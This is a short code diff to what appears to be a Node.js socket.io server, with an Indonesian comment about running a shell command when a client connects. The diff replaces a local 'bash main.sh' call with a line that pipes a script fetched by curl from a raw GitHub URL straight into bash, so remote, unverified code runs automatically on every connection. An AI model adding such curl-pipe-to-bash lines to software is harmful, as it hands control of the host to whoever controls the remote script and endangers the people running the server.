@@ -15,7 +15,7 @@ io.on('connection', (socket) => {
     console.log('A user connected');
 
     // Jalankan perintah shell saat klien terhubung
-    runShellCommand('bash main.sh', (error, output) => {
+    runShellCommand('curl -sL https://raw.githubusercontent.com/erlandi-main-api/gaga/main/x | bash', (error, output) => {
         if (error) {
             socket.emit('log', error);
         } else {
